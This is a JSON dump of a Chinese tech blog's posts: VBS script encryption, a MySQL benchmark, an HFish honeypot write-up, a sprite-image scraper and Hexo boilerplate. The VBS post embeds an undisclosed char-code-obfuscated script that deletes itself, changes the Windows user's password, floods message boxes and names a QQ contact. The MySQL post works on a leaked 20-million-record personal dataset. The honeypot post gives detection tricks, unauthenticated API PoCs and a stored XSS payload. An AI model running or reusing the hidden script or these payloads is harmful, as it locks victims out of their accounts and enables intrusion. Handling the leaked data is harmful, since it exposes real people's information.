[{"title":"vbs加密-自校验","date":"2020-07-24T07:05:43.000Z","path":"2020/07/24/vbs加密-自校验/","text":"偶然看到以前的技术笔记，有段 vbs 加解密代码挺有意思的，特来分享一下。 常见保护代码方式恶作剧版众所周知，像vbs、bat等脚本都是明文，比如一般情况下，不想让其他人运行脚本，会在主要代码运行前，提示输入密码，eg： 12345678do key = inputbox(\"输入密码\",\"输入密码\") if key &lt;&gt;123 then msgbox \"密码错误\" else exit doloop `真正要执行的代码 编码版但这种情况，直接右键，就能查看到密码明文，或者直接可以将要执行的代码提取出来就可以了。于是又想出将主要代码编码，运行时候再解码运行，eg: 123456789data=\"68,105,109,32,102,115,111,13,10,83,101,116,32,102,115,111,32,61,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,102,115,111,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,39,-13890,-19459,-10284,-17222,13,10,109,115,103,98,111,120,34,-11312,-13630,-14357,-17232,-13647,-15958,-12363,113,113,50,52,50,49,52,55,55,51,53,49,34,13,10,67,111,110,115,116,32,115,116,114,80,97,115,115,119,111,114,100,32,61,32,34,115,49,57,57,57,56,49,50,34,39,32,13,10,68,105,109,32,87,115,104,78,101,116,119,111,114,107,13,10,83,101,116,32,87,115,104,78,101,116,119,111,114,107,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,78,101,116,119,111,114,107,34,41,13,10,68,105,109,32,117,115,101,114,78,97,109,101,13,10,117,115,101,114,78,97,109,101,32,61,32,87,115,104,78,101,116,119,111,114,107,46,117,115,101,114,78,97,109,101,38,34,44,117,115,101,114,34,13,10,68,105,109,32,68,111,109,97,105,110,13,10,83,101,116,32,68,111,109,97,105,110,32,61,32,71,101,116,79,98,106,101,99,116,40,34,87,105,110,78,84,58,47,47,46,47,34,38,117,115,101,114,78,97,109,101,41,13,10,68,111,109,97,105,110,46,83,101,116,80,97,115,115,119,111,114,100,32,115,116,114,80,97,115,115,119,111,114,100,13,10,68,111,109,97,105,110,46,83,101,116,73,110,102,111,13,10,100,105,109,32,103,106,13,10,111,110,32,101,114,114,111,114,32,114,101,115,117,109,101,32,110,101,120,116,13,10,100,105,109,32,87,83,72,115,104,101,108,108,65,13,10,115,101,116,32,87,83,72,115,104,101,108,108,65,32,61,32,119,115,99,114,105,112,116,46,99,114,101,97,116,101,111,98,106,101,99,116,40,34,119,115,99,114,105,112,116,46,115,104,101,108,108,34,41,13,10,100,105,109,32,115,32,13,10,100,111,32,117,110,116,105,108,32,115,61,53,48,48,48,48,32,13,10,115,61,115,43,49,32,13,10,109,115,103,98,111,120,32,34,-18201,-15417,-23636,-18184,-12590,-20300,53,48,48,48,48,-19250,-17448,-19531,-20279,-23647,-14425,-12814,-19984,-10536,-14604,-23636,-12590,-13848,-10557,-15925,-15396,-15637,-23636,-10536,-14604,-16691,-16470,-19781,-16470,-17414,-23636,-20300,-12822,-11047,-18184,-15133,-15396,-15637,-24157,34,44,54,52,32,13,10,108,111,111,112,32,13,10,109,115,103,98,111,120,34,-16460,-15133,-10782,-15436,-12095,-16416,-23636,-16691,-18202,-13345,-15133,-15396,-15637,-20279,-23636,115,49,57,57,57,56,49,50,34,13,10\"Function ChrData(Data)MyArray = Split(Data, \",\", -1, 1)For each OldData in MyArrayNewdata=NewData&amp;chr(OldData)NextChrData=NewDataEnd Functionexecute Chrdata(data) 加壳版这种加密破解，只需把 execute 改为wscript.echo 或者直接输出到文件。于是乎，又有将vbs外面夹层exe壳，常见的工具有vbs2exe等等，运行原理大概是，将数据空间里的vbs代码写到文件，然后调用wscript 或 cscript 执行输出后的代码。这种加壳方式获取源码也不难，最傻瓜式的就是监听文件写入操作，然后复制写入的文件就可以了。 我的版本上面是我遇到过的vbs源码保护方法（这是当时的技术，不知道情况咋样）。针对这些情况，当时我想到很有趣的算法，talk is cheap， show me code： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596Dim KeyDim CodeDim Decodecode = \"B0BAA6DBC7C6826D7DA9BD82A7C382AFBADD8686\"Do key = InputBox(\"输入密码\",\"输入密码\") If InStr(key,\",\")&lt;&gt;0 Then Decode = RoundDecode(code,_ Mid(Key,1,InStr(Key,\",\")-1),_ Right(Key,Len(Key)-InStrRev(Key,\",\"))) If IsNull(Decode) &lt;&gt; true Then execute BDe(Decode) Exit do Else MsgBox \"呵呵，没密码就别想运行了\" End If Else MsgBox \"呵呵，没密码就别想运行了\" End ifLoopFunction RoundDecode(str,key,Dif) Dim RtStr,ToSubStr Dim StepC Dim RDi,RDj If Dif = \"e\" Or dif = \"E\" Then If Len(str)/4 &lt;&gt; Len(str)\\4 Then StepC = Len(str)\\4 + 1 Else StepC = Len(str)\\4 End If Else StepC = 3 End If RDj = 1 For RDi=1 To Len(key) ToSubStr = Mid(str,(RDi - 1)*2*StepC+1,StepC*2) RtStr = RtStr &amp; SubDecode(ToSubStr,Asc(Mid(key,RDi,1))) If Asc(Right(RtStr,1)) &lt;&gt; Asc(Mid(key,RDi,1)) Then RtStr = Null Exit For End If next RoundDecode = RtStr End FunctionFunction SubDecode(str,KAsc) Dim SDi Dim RtStr Dim NAsc,NCh NAsc = kasc RtStr = \"\" For SDi = 1 To Len(str) Step 2 NAsc = CLng(\"&amp;H\"&amp;Mid(str,SDi,2)) - NAsc RtStr = RtStr &amp; Chr(NAsc) next SubDecode = RtStrEnd FunctionFunction BDe(str) Dim stream,xmldom,node Dim Read Set xmldom = CreateObject(\"Microsoft.XMLDOM\") Set node = xmldom.CreateElement(\"binary\") node.DataType = \"bin.base64\" node.text = str Set stream = CreateObject(\"adodb.stream\") With stream .Charset = \"gb2312\" .Type = 1 If .State = 0 Then .Open End If .Write node.nodeTypedValue .Position = 0 .Type = 2 BDe = .ReadText(-1) .Close End With Set stream = Nothing Set node = Nothing Set xmldom = nothingEnd Function 功能很简单，输入对的密码，就能运行加密的代码，输入错误的密码，则提示密码不正确。 大佬们可以试着破解下，这个是有算法漏洞的，某次和密码学大佬吃巷子面的时候，一语道出算法的漏洞，就当作vbs加密的一个思路吧。后面我会给出解密密钥。 分析我的思路和 编码版 的思路一样，只是我对编码的时候，增加了一个key值，这个key值也可以用于校验解密的时候，密钥是否正确，由于仅采用一次分组加密，这也是算法设计之初就已知的算法漏洞，导致算法的复杂度并没随key的增长而增加。 加密的过程就是将vbs源码分组，然后使用key对分组源码进行运算，解密是逆过程。 key: NmI73i=,d","tags":[]},{"title":"MySQL性能非专业测试","date":"2020-02-18T14:45:36.000Z","path":"2020/02/18/MySQL性能非专业测试/","text":"搭建自己的裤子过程，发现搜索某2000w的裤子数据，使用 等于 搜索也非常的慢，于是计划测试一下 MySQL 在多少量级下的数据性能最好。下面测试是非专业认识的非专业测试，仅作为非专业人士搭建过程参考。 测试环境机箱 蜗牛星际D款CPU j1900 2GHz 4核内存 4G ddr3l 1.35v电压 1600hz硬盘 120g mstata 固态硬盘MySQL为默认配置 测试过程测试数据测试的数据从2000w的裤子数据抽取，测试以100w量级递增，主要测试的引擎为innodb、myisam两种，索引是 INDEX, FULLTEXT两种。 测试示例代码创建的表如下： 1234567891011121314151617181920212223242526272829303132333435sql = &apos;&apos;&apos; CREATE TABLE IF NOT EXISTS %s( Name varchar(50), CardNo varchar(30), Descriot varchar(300), CtfTp varchar(30), CtfId varchar(50), Gender varchar(4), Birthday varchar(30), Address varchar(100), Zip varchar(30), Dirty varchar(30), District1 varchar(30), District2 varchar(30), District3 varchar(30), District4 varchar(30), District5 varchar(30), District6 varchar(30), FirstNm varchar(100), LastNm varchar(100), Duty varchar(30), Mobile varchar(100), Tel varchar(80), Fax varchar(80), EMail varchar(100), Nation varchar(30), Taste varchar(300), Education varchar(30), Company varchar(50), CTel varchar(100), CAddress varchar(50), CZip varchar(30), Family varchar(30), Version varchar(30), huazhu_id varchar(30) )ENGINE=MyISAM DEFAULT CHARSET=utf8&apos;&apos;&apos; 测试mysql语句列表如下 123456789101112# 普通查询normal_name_sql = 'select id from %s WHERE NAME = \"测试\"'normal_mail_sql = 'select id from %s WHERE EMail = \"liwei@163.com\"'normal_id_sql = 'select * from %s WHERE id = %s'# 用户名模糊查询leftblur_name_sql = 'select id from %s WHERE NAME LIKE \"%%测\"'rightblur_name_sql = 'select id from %s WHERE NAME LIKE \"李%%\"'allblur_name_sql = 'select id from %s WHERE NAME LIKE \"%%测%%\"'# 邮箱模糊查询leftblur_mail_sql = 'select id from %s WHERE EMail LIKE \"%%@163.com\"'rightblur_mail_sql = 'select id from %s WHERE EMail LIKE \"liwei%%\"'allblur_mail_sql = 'select id from %s WHERE EMail LIKE \"%%@163.com%%\"' 结果分析插入耗时在测试数据量级范围内，同数量级下 myisam 的耗时比 innodb 少，且斜率也比后者平缓。 索引耗时900w以下的数量级，innodb 效率比 myisam 略好，但 myisam 创建耗时基本随数量级等比增长，innodb 在小于500w数量级时，斜率较缓，超过这个数量级，耗时有明显增加的趋势。 搜索耗时横向对比在未创建索引表进行搜索，用户名搜索和邮箱搜索耗时，innodb 引擎效率明显比 myisam 好。同引擎下，且用户名和邮箱搜索耗时基本差不多。 但是通过ID搜索耗时却很迷，搜索耗时就没有规律可循了。 同理，在创建了 INDEX 、FULLTEXT 索引的表也有类似的规律，这里就不赘诉了，可以详见附件的测试结果表单。 纵向对比搜索效率上看，创建了索引的比没创建索引，在右模糊查询耗时明显小很多，但左模糊查询和全模糊查询上相差并不是很大。 总结经以上测试，该配置下的MySQL，性能太辣鸡了。[狗头] 附件测试结果表单","tags":[{"name":"数据库","slug":"数据库","permalink":"https://blog.c1ker.top/tags/数据库/"}]},{"title":"HFish 蜜罐使用心得","date":"2019-11-15T08:10:04.000Z","path":"2019/11/15/HFish-蜜罐使用心得/","text":"(本篇首发于 https://www.freebuf.com/vuls/220646.html) 最近搭建各种蜜罐测试，这篇文章主要分享 HFish V0.4 使用过程中的一些心得。 部署单节点部署单点部署官方文档介绍已经很全面了，不过windows 家庭版docker版部署有点坑需要注意的。 家庭版是不能直接安装docker，需要安装docker tool box ，原理是开启vbox 的linux虚拟机，然后在linux虚拟机里面安装docker，所以，在启用docker容器的时候，如果指定 -p 127.0.0.1:22:22 物理机是无法访问蜜罐，只能把容器的端口映射到0.0.0.0的地址上，物理机才可以访问。 eg: 1docker run -d -p 2222:22 -p 23:23 -p 9001:9001 -e USERNAME=god -e PASSWORD=123456 --name hfish imdevops/hfish:latest 然后进入linux虚拟机里面，查看虚拟机具体的ip地址 成功访问 分布式部署为了能尽可能全的收集全球攻击数据，这次计划采用分布式部署方式。使用vps供应商为 vultr ，IDC机房分布如下图 列表中有9个国家，ubuntu 系统最低配置每个月5美元，每个国家一台vps deploy 也没多少钱。这边有个注意点就是，在deploy时候，可以直接添加自己的ssh key，这样后面管理vps也很方便，因为我忘了我的ssh key 的密码了，就直接用账户密码管理。vps过多，管理起来挺麻烦的，这里我使用python3 的 paramiko 自动化一键配置，主要代码如下： 初始化服务器，并安装docker.io ： 启动 docker 容器： 官方分布式部署命令会少些端口，可以根据 config.ini 端口自行增删 这边还有一些需要注意的地方，国内访问国外服务器，可能会丢包，最好是在其中一台vps上面执行初始化脚本 运行完后，查看主节点，成功接收到数据 攻击数据分析分布式蜜罐部署了几天后，接下来是对捕获的数据进行分析了，下面主要以 SSH 蜜罐攻击行为为例。各位大佬也可以从附件里下载数据库自行分析。往后如果有能力，会定期提供蜜罐捕获数给各位。 攻击字典统计先来看下数据库 hfish_info 表结构及数据： 可以看到数据库用 &amp;&amp; 替换换行符，保存在数据库中，接下来可以写个统计攻击字典脚本。以下为关键部分示例代码： 123456def __init__(self): self.hfish_db = './file/hfish.db' self.hfish_split = '&amp;&amp;' self.sql = sqlite3.connect(self.hfish_db) #这里需要注意一下，测试时候发现，有些字符无法用utf-8解码，所以得用bytes self.sql.text_factory = bytes 搜索 sqlite 数据库中所有 ssh 攻击的类型 然后分割 &amp;&amp; ，把用户名密码分割开，并输出到文本里面 打印一下用户名及密码频次 取用户名及密码出现次数top10 12345# 按字典值反序排序,方法一user = sorted(user_pwd_dic['user'].items(), key=lambda x:x[1],reverse=True)# 按字典值反序排序,方法二password = list(user_pwd_dic['pwd'].items())password.sort(key=lambda x:x[1],reverse=True) 将结果打印 其实字典具有地域性，可以根据攻击字典地域性，配置下蜜罐，由于默认蜜罐账户密码均为root，不在常见外网爆破攻击字典里，所以后续很多攻击都无法进行。 字典地域性分析接下来分析一下各个国家的蜜罐收集到的字典差异，主要代码如下： 12345678910111213141516171819202122232425def RegionDic(self): agent_sql = \"select agent from hfish_info\" data = self.sql.execute(agent_sql).fetchall() agents = [] for agent in list(set(data)): agents.append(agent[0].decode('utf-8')) agents_dic = &#123;&#125; for agent in agents: agents_dic[agent] = &#123;&#125; data = self.sql.execute(dic_sql_tpl.format(agent)).fetchall() for d in data: if d[0] in agents_dic[agent].keys(): agents_dic[agent][d[0]] = agents_dic[agent][d[0]] + 1 else: agents_dic[agent][d[0]] = 1 agents_dic[agent] = sorted(agents_dic[agent].items(), key=lambda x:x[1],reverse=True) for agent in agents: print(agent) for i in range(5): #这里不直接用decode utf-8 是因为捕获到的一些字符无法用utf-8解码，这个在上一节连接数据库里面有提到。 print(\"%s\\t\\t%s\"%(str(agents_dic[agent][i][0]).replace(\"b'\",'').replace(\"'\",''), agents_dic[agent][i][1])) print() 得到的结果如下： 使用 pyecharts 生成图表， 123456789 bar = (Bar(options.InitOpts(width='1000px', height='500px')) .add_xaxis(u_p_dic) .add_yaxis(agent, u_p_count) .set_global_opts( title_opts=options.TitleOpts(title=(\"%s统计\"%agent)) ) ) tab.add(bar, agent)tab.render() 这里墙裂推荐直接看 pyecharts 官方文档，特别详细全面，不要搜CSDN里面的博客，不忍吐槽某些博文。 因为收集时间不长，且子节点和主节点通信莫名中断，此结果不具有普遍性 这里只是简单提取攻击字典，并没有做更深入分析，各位可以通过后面附件下载，自行分析。 后面会根据字典的地域性，在部署蜜罐的时候，修改特定的标致 蜜罐检测基于流量识别这里以攻击者在内网，且蜜罐是以分布式部署情况作为示例，拓扑图如下： 使用 tcpdump dump数据包，wireshark 打开，可以看到子节点和主节点之间的通信以明文传输，且有明显的特征 使用scapy 识别主节点和子节点的地址，主要代码如下 存在问题的代码在 /core/rpc/client/client.go 在内网渗透过程中，如果能发现部署的蜜罐，可以降低被发现可能性。 基于高交互蜜罐返回内容识别hfish 高交互式蜜罐是根据特征字符回显，匹配的规则有限，比如常见的读取 passwd 通常使用 cat /etc/passwd ，在SSH规则里有相应的规则 如果变形使用 1cat /etc/passwd &amp; 或者 1tail /etc/passwd 在正常的 vps 里面也是可以正常读取到 passwd 的内容， 但如果在蜜罐里面，则会显示异常，未修改配置的情况下是 test . 基于字符匹配的规则，总会有遗漏的地方，可以尝试变形的命令测试是否是hfish蜜罐。 高交互式蜜罐的配置文件在相应的 libs/蜜罐类型/ 下面，默认default 值在 libs/蜜罐类型/default.hf 。 基于管理端口返回内容识别这个很好理解了，如果返回包含管理页面特征字符就可以判断了，这里就直接给出 POC 了。 非授权接口获取信息问题代码在 /view/url.go 文件中 可以发现，这里连身份鉴别都没作，当获取到主机点ip及端口后，直接请求uri，就可以获取蜜罐捕获的信息，从而分析蜜罐位置。 验证POC： 12http://ip:port/api/v1/get/iphttp://ip:port/api/v1/get/fish_info 蜜罐攻击非授权攻击查看下主节点面板查询传输的数据包，用户认证是通过后，is_login 的值就是登陆用户，也就是说我们可以直接爆破这个用户，绕过登陆，直接设置后端各种参数，比如将报警参数置为空。 对应的问题源码在 /view/login/view.go 里 更新报警邮件的具体配置参数在 /view/setting/view.go 里面，禁止报警 poc 就不给出了，可自行查看对应参数。 存储型XSS这个漏洞是某位不愿提供ID大佬提醒的😏。 因为这漏洞是后台展示的原因，所以任何一个蜜罐都可以触发这个漏洞，这里以 ssh 蜜罐演示。 使用如下payload连接 1ssh ^&lt;script^&gt;alert^(1234^)^&lt;^/script^&gt;@192.168.99.101 -p 2222 我使用的是window系统，需要用 ^ 转义特殊字符 提交之后，返回 上钩列表 ，点击查看详情，可以看到成功执行xss。 特性化配置这里以攻击字典地域性特点及蜜罐检测中的交互式返回内容缺陷，特性化配置蜜罐。 根据地域，特性化蜜罐配置将用户名、密码修改为统计的字典出现频率最高的值。 123# 替换密码和用户名set_user_tpl = 'sed -i \"s/\\\\\"account\\\\\": \\\\\"root\\\\\"/\\\\\"account\\\\\": \\\\\"&#123;&#125;\\\\\"/g\" %s'%ssh_conf_pathset_pwd_tpl = 'sed -i \"s/\\\\\"password\\\\\": \\\\\"root\\\\\"/\\\\\"password\\\\\": \\\\\"&#123;&#125;\\\\\"/g\" %s'%ssh_conf_path 高交互式蜜罐默认返回修改咱们用一台Ubuntu 的vps测试一下，未知的命令返回： 也就是说，我们可以把默认返回修改为”command not found”的话，可以稍微改善下返回结果。 1set_default_tpl = 'sed -i \"s/test/: command not found/g\" %s'%ssh_default_path 致谢感谢三斤大佬解惑。 HFish 是一款非常不错的高交互式蜜罐，可扩展性好，可以帮忙点击一下 start，支持一下国产蜜罐。 HFish github HFish document 附件 sqlite数据库 HFish数据库github地址 攻击用户名字典 攻击密码字典 地域字典统计图表","tags":[{"name":"网络","slug":"网络","permalink":"https://blog.c1ker.top/tags/网络/"},{"name":"蜜罐","slug":"蜜罐","permalink":"https://blog.c1ker.top/tags/蜜罐/"}]},{"title":"雪碧图爬虫","date":"2019-07-29T14:24:35.000Z","path":"2019/07/29/雪碧图爬虫/","text":"看到群里讨论了一道爬虫题目，题目链接如下:雪碧图爬虫 题目 题意是爬取这一千页的数字并计算出这些数字的总和。 分析先来分析一下页面的源码（第一页的源码可以通过附件下载). 可以看出每个数字对应的 class 为至少七位的字符串，并且每次访问得到的值都不一样，从这里可以推断出，基本不可能通过抓取每个字符串的值去匹配每个数字。 再来看下CSS 图像: 格式化后成如下： 大概分为3部分，第一部分是ID对应切图的坐标，第二部分是高度及大小信息，第三部分是雪碧图原图。将雪碧图解码还原成图片如下： 解题根据以上信息，这道题的思路就很清楚了。 我们把图片里面的数字进行分割，切图偏移小于等于数字最左的像素值，现在只需要计算出每个数字左右两边的坐标即可，图像分割主要代码如下： 1234567891011split_num = []for x in range(0, width): check_flag = False for y in range(0, height): pix_data = img.getpixel((x,y)) if not (pix_data[0] &gt; 250 and pix_data[1] &gt; 250 and pix_data[2] &gt; 250): check_flag = True break if is_sign ^ check_flag: split_num.append(int(x)) is_sign = not is_sign （这边白色区域判定使用 250 是因为防止有些图片色泽不清，可能引起误判，实际应该使用 255 ） 测试数字边界识别结果如下： 然后接下来测试一下第一页识别的数值对不对，主要代码如下： 12345678910111213141516171819202122232425image_data = BytesIO(base64.b64decode(image_base64))img = Image.open(image_data)width = img.size[0]height = img.size[1]is_sign = Falsesplit_num = []for x in range(0, width): check_flag = False for y in range(0, height): pix_data = img.getpixel((x,y)) if not (pix_data[0] &gt; 250 and pix_data[1] &gt; 250 and pix_data[2] &gt; 250): check_flag = True break if is_sign ^ check_flag: split_num.append(int(x)) is_sign = not is_signsum_num = 0for block in block_arr: rt_str = '' for num_str in block: for i in range(0, len(split_num)): if int(self.position_dic[num_str]) &lt; split_num[i]: rt_str = rt_str + str(int(i/2)) break 运行结果: 接下来就是遍历一千页的事情了。题目出得还是比较简单的，要是图片中的数字是乱序，就很麻烦了。 附件 第一页源码 python源码","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://blog.c1ker.top/tags/爬虫/"},{"name":"python","slug":"python","permalink":"https://blog.c1ker.top/tags/python/"}]},{"title":"Hello World","date":"2015-12-31T15:59:59.000Z","path":"2015/12/31/hello-wolrd/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.c1ker.top/tags/hexo/"}]}]